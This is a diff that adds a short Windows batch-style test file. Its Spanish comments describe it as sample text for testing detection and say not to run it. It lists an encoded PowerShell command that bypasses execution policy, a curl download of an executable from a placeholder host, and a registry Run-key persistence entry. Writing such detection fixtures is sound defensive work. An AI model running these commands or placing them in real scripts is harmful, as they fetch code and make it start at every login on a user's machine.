@@ -1,0 +1,5 @@
+REM Archivo de ejemplo para probar detección textual.
+REM No ejecutar. Es texto de prueba.
+powershell -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>
+curl https://example.invalid/file.exe -o file.exe
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Example /d example.exe
